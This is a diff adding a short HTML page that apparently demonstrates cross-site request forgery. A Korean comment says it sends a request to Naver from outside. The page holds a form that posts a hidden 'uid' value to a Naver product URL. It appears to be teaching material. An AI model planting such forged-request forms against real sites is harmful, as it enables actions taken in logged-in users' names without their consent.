@@ -1,0 +1,11 @@
+<html>
+    <head></head>
+    <body>
+        <h1>CSRF(Cross Site Request Forgery)</h1>
+        <!-- 외부에서 네이버로 요청합니다. -->
+        <form action="http://www.naver.com/product/643534" method="POST">
+            <input type="hidden" name="uid" value="1">
+            <input type="submit">
+        </form>
+    </body>
+</html>
